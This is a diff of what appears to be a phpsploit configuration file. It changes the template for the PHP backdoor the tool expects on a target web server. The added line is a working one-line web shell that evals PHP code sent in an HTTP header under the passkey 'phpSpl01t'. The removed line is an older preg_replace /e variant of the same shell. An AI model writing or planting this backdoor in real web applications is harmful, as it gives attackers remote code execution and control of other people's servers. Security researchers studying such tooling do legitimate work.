@@ -30,7 +30,7 @@ PASSKEY=phpSpl01t
 ### template of backdoor syntax to use:
 ### Requiements: to be phpsploit compatible, your backdoor
 ### have to eval the %%PASSKEY%% http header
-BACKDOOR=<?php @preg_replace('/(.*)/e',$_SERVER['HTTP_%%PASSKEY%%'],'');?>
+BACKDOOR=<?php @eval($_SERVER['HTTP_%%PASSKEY%%']);?>
 
 ###### HTTP_USER_AGENT #######
 ### user-agent to use for requests:
